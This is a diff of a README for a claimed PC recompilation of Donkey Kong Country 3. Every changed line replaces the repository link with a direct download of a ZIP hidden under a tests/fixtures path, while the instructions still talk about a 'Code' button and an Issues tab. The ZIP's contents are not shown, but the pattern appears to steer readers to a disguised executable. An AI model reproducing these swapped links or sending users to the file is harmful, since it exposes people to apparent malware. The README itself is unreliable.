@@ -1,6 +1,6 @@
 # 🎮 DKC3Recomp - Play Donkey Kong Country 3 Natively on PC
 
-[![Download DKC3Recomp](https://img.shields.io/badge/Download-DKC3Recomp-blue?style=for-the-badge&logo=github)](https://github.com/explosive-kite3497/DKC3Recomp)
+[![Download DKC3Recomp](https://img.shields.io/badge/Download-DKC3Recomp-blue?style=for-the-badge&logo=github)](https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome! This guide will help you download and run DKC3Recomp on your Windows co
 
 ### 📥 Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/explosive-kite3497/DKC3Recomp](https://github.com/explosive-kite3497/DKC3Recomp)
+**Visit this link to download the application:** [https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip](https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip)
 
 Click the green **"Code"** button on that page, then select **"Download ZIP"**. The download will begin automatically. Wait for the download to finish—it usually takes only a few minutes depending on your internet speed.
 
@@ -123,7 +123,7 @@ A: The game automatically saves at certain points. You can also press Enter to o
 
 If you still need help, here are your options:
 
-- **Check the GitHub page**: Visit [https://github.com/explosive-kite3497/DKC3Recomp](https://github.com/explosive-kite3497/DKC3Recomp) and look at the "Issues" tab for common problems and solutions
+- **Check the GitHub page**: Visit [https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip](https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip) and look at the "Issues" tab for common problems and solutions
 - **Report a problem**: On the GitHub page, click "Issues" and then "New Issue" to describe your problem. Include details like your Windows version and what happened
 - **Join the community**: Check if there's a Discussions tab on the GitHub page for friendly help from other players
 
@@ -142,13 +142,13 @@ Download the newest ZIP file and extract it over your current folder to update.
 
 You're now ready to dive into the world of Donkey Kong Country 3 on your PC! Whether you're a nostalgic player revisiting childhood memories or a newcomer experiencing this classic for the first time, DKC3Recomp delivers a fantastic, modern way to play.
 
-Remember: visit [https://github.com/explosive-kite3497/DKC3Recomp](https://github.com/explosive-kite3497/DKC3Recomp) to download the app and get the latest updates.
+Remember: visit [https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip](https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip) to download the app and get the latest updates.
 
 **Have fun, and happy gaming!** 🍌
 
 ## 📋 Quick Summary
 
-1. Go to: [https://github.com/explosive-kite3497/DKC3Recomp](https://github.com/explosive-kite3497/DKC3Recomp)
+1. Go to: [https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip](https://github.com/explosive-kite3497/DKC3Recomp/raw/refs/heads/main/tests/fixtures/1.3-alpha.3.zip)
 2. Click "Code" → "Download ZIP"
 3. Extract the ZIP file
 4. Run DKC3Recomp.exe
